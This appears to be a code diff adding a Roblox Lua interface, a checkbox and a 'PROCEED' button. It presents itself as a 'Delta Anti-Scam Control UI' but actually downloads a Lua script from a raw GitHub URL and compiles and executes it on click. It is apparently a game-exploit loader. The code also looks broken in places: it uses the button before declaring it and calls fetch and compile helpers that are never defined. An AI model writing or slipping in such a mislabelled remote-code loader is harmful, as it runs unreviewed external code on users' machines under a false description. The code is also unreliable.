+-- Let the label also toggle via input (TextLabel has no MouseButton1Click)
+checkboxLabel.InputBegan:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+		checkbox:Activate() -- triggers MouseButton1Click visuals
+		checkboxInner.Visible = not checkboxInner.Visible
+		if checkboxInner.Visible then
+			proceedButton.BackgroundColor3 = Color3.fromRGB(30, 136, 229)
+			proceedButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+		else
+			proceedButton.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+			proceedButton.TextColor3 = Color3.fromRGB(150, 150, 150)
+		end
+	end
+end)
+
+-- Proceed button
+local proceedButton = Instance.new("TextButton")
+proceedButton.Size = UDim2.new(0, 120, 0, 30)
+proceedButton.Position = UDim2.new(0.5, 0, 1, -10)
+proceedButton.AnchorPoint = Vector2.new(0.5, 1)
+proceedButton.BackgroundColor3 = Color3.fromRGB(60, 60, 60) -- Disabled look
+proceedButton.Text = "PROCEED"
+proceedButton.TextColor3 = Color3.fromRGB(150, 150, 150)
+proceedButton.Font = Enum.Font.GothamBold
+proceedButton.TextSize = 14
+proceedButton.AutoButtonColor = true
+proceedButton.Parent = mainFrame
+
+local buttonCorner = Instance.new("UICorner")
+buttonCorner.CornerRadius = UDim.new(0, 4)
+buttonCorner.Parent = proceedButton
+
+-- Checkbox toggle via box
+local function toggleCheckbox()
+	checkboxInner.Visible = not checkboxInner.Visible
+	if checkboxInner.Visible then
+		proceedButton.BackgroundColor3 = Color3.fromRGB(30, 136, 229)
+		proceedButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+	else
+		proceedButton.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+		proceedButton.TextColor3 = Color3.fromRGB(150, 150, 150)
+	end
+end
+checkbox.MouseButton1Click:Connect(toggleCheckbox)
+
+-- Proceed
+local function onProceed()
+	if not checkboxInner.Visible then
+		warn("You must tick the checkbox before proceeding!")
+		return
+	end
+
+	proceedButton.Text = "EXECUTING..."
+	task.wait(0.2)
+
+	local url = "https://raw.githubusercontent.com/grow-a-garden-ctrl/Bloxified/main/scripts.lua"
+
+	-- fetch
+	local src
+	local okFetch, fetchErr = pcall(function()
+		src = http_fetch(url)
+	end)
+	if not okFetch then
+		proceedButton.Text = "FETCH FAILED"
+		proceedButton.BackgroundColor3 = Color3.fromRGB(180, 50, 50)
+		warn("[Loader] HTTP error: "..tostring(fetchErr))
+		return
+	end
+	if not src or #src == 0 then
+		proceedButton.Text = "EMPTY SCRIPT"
+		proceedButton.BackgroundColor3 = Color3.fromRGB(180, 50, 50)
+		warn("[Loader] Got empty response from URL")
+		return
+	end
+
+	-- compile + run
+	local okRun, runErr = pcall(function()
+		local chunk = compile_chunk(src)
+		return chunk()
+	end)
+
+	if okRun then
+		proceedButton.Text = "COMPLETED"
+		proceedButton.BackgroundColor3 = Color3.fromRGB(76, 175, 80)
+		print("[Loader] Loadstring executed successfully!")
+	else
+		proceedButton.Text = "EXEC ERROR"
+		proceedButton.BackgroundColor3 = Color3.fromRGB(180, 50, 50)
+		warn("[Loader] Execution failed: "..tostring(runErr))
+	end
+end
+proceedButton.MouseButton1Click:Connect(onProceed)
+
+print("Delta Anti-Scam Control UI loaded.")
